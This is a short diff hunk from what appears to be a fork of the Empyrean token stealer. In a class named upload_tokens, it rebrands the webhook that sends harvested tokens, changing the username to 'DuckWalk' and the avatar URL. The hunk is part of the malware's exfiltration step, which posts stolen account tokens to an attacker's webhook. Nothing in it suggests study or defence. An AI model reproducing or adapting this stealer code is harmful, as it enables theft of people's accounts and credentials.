@@ -393,5 +393,5 @@ class upload_tokens:
 
             embed.set_footer(text="github.com/addi00000/empyrean")
 
-            self.webhook.send(embed=embed, username="Empyrean",
-                              avatar_url="https://i.imgur.com/HjzfjfR.png")
+            self.webhook.send(embed=embed, username="DuckWalk",
+                              avatar_url="https://uploads.dailydot.com/2024/10/smoking-duck-meme.jpg?auto=compress&fm=pjpg")
